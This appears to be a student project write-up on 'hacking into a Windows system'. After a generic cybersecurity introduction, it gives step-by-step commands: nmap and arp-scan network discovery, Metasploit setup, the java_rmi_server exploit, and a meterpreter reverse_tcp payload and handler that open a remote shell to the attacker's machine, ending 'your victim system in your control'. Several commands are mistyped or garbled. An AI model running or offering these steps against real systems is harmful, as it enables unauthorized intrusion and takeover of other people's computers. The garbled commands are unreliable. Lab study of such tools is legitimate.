Hello everyone!

This is based on my project over Cyber Security on Hacking and Penetrating into a Windows System

INTRODUCTION

   Cybercrime is a global problem that’s been dominating the news cycle. It poses a threat to individual security and an even bigger threat to large international companies, banks, and governments.
   
   Today’s organized cybercrimes far out shadow lone hackers of the past now large organized crime rings function like start-ups and often employ highly-trained developers who are constantly innovating online attacks. It can be rightfully said that today’s generation lives on the internet, and we general users are almost ignorant as to how those random bits of 1’s and 0’s reach securely to our computer.
   
   For a hacker, it’s a golden age. With so many access points, public IP’s and constant traffic and tons of data to exploit, black hat hackers, are having one hell of a time exploiting vulnerabilities and creating malicious software for the same. Above that, cyber-attacks are evolving by the day. Hackers are becoming smarter and more creative with their malware and how they bypass virus scans and firewalls still baffles many people. There has to be some sort of protocol that protects us against all these cyberattacks and makes sure our data doesn’t fall into the wrong hands. 
   
   Cybersecurity refers to a set of techniques used to protect the integrity of networks, programs and data from attack, damage or unauthorized access.
   
   From a computing point of view, security comprises cybersecurity and physical security both are used by enterprises to protect against unauthorized access to data centres and other computerized systems. Information security, which is designed to maintain the confidentiality, integrity, and availability of data, is a subset of cybersecurity. The use of cyber security can help prevent cyber-attacks, data breaches, and identity theft and can aid in risk management.
 
   There are three main aspects we are trying to control, name: 
•	Unauthorised Access
•	Unauthorised Deletion
•	Unauthorised Modification
 		
   These three terms are synonymous with the very commonly known CIA triad which stands for Confidentiality, Integrity, and Availability.
   
   The CIA triad which stands for Confidentiality, Integrity, and Availability is a design model to guide companies and organizations to form their security policies. It is also known as the AIC triad to avoid confusion with Central Intelligence Agency (CIA).
When identifying, analysing and treating a cyber-attack, there are three principals that are kept in mind for various calculations. They are:
•	Vulnerability
•	Threat
•	Risk


MODULE DESCRIPTION

3.1 Tasks
    Hack into a Windows Machine by performing Network Scanning to find exploits and perform MITM on your Windows Machine

3.2 Target
    Device with Windows Operating System 

3.3 Tools
•	Bettercap
•	Nmap
•	Wireshark

3.4 Processes
•	Disabling the firewall
•	Network Scanning to find exploits
•	Perform MITM
•	Find and exploit the Vulnerabilities
•	Downloading payload
•	Exploit DB

# hacking_system

Step 1: Do a host discovery & perform an Enumeration

Command: arp-scan 192.168.0.1/24<Enter your network Range>
Command: nmap -sS 192.168.0.1/24 -v
Command: nmap -sS -A 192.168.0.104 -vv


Step 2: Meanwhile, Setup msfconsole

Command: service postgresql start
Command:su postgress
command: createuser msfuser1 -P <replace “msfuser1” with your username>

Set the user as superuser & create a database
Command:  reated msfproj1 –owner=msfuser1 <replace “msfproj1” with your database name & “msfuser1” with your username>
Command: exit

Start the msfconsole
Command: msfconsole


Step 3: Connect to new user & DB in msfconsole & Create new Workspace
msf> db_disconnect
msf> db_connect msfuser1:admin@localhost/msfproj1
db_connect user:pass@host/dbname

To see the current workspace,
msf> workspace
msf> workspace -a newproject <replace with your  esired name>
msf> workspace “newproject”
 
Now just check everything.
msf> db_status
msf> workspace


Step 4: Populate the hosts & services to metasploit db.
This is one of the cool features of msfconsole. You can add hosts,services & vulnerabilities to the database. 
We can run nmap from within msfconsole. All the results are stored in the database also. Issue an nmap scan agian within msfconsole. 
Here only difference is we use db_nmap instead of the regular command.
msf> db_nmap -sS 192.168.0.1/24 -vv


Step 5: Identify a vulnerable service.
 

Step 6: Search & Use Module in msfconsole.
msf> search java_rmi
msf> info exploit/multi/misc/java_rmi_server
msf> use exploit/multi/misc/java_rmi_server
 
Now you can see the prompt has changed. We can see the options by
>show options

Set the RHOST which is our target which is running the vulnerable service.
set RHOST 192.168.0.104

Remember to set all options which have a “Required YES” value. See the table of options. 
Also check if the RPORT is also correct. Check the Nmap result & the currently set Port and see if it matches. 
Next we have to set all the required options & a payload. First we have to search for compatible payloads. 
All payloads may not be compatible with current module.
>show payloads

Then for setting it, copy the path & issue:
>set PAYLOAD java/meterpreter/reverse_tcp

Meterpreter is a state of the art payload. We can have lot of fun with this powerful payload. 
We will discuss that later. Now set the LHOST, which is the machine to which the payload has to return connection. 
Remember to give the full ip address instead of localhost or 127.0.0.1 etc
set LHOST 192.168.0.103

If you want, you can change the listening Port
set LPORT 4445

All set, now
 
meterpreter> ifconfig
meterpreter>getuid
 

Step 7: Brief it UP.
As this post got a bit lengthy, I have included a screenshot of the procedure very briefly.
 
Open terminal:
 
TYPE: msfconsole		

It will a minute.

TYPE: use exploit/multi/handler
TYPE: set payload windows/meterpreter/reverse_tcp	

And we need to set your local host

TYPE: set lhost (your ip address)
TYPE: set lport (HERE)
TYPE: exploit	

And now your victim system in your control

TYPE: HELP		
For see commands
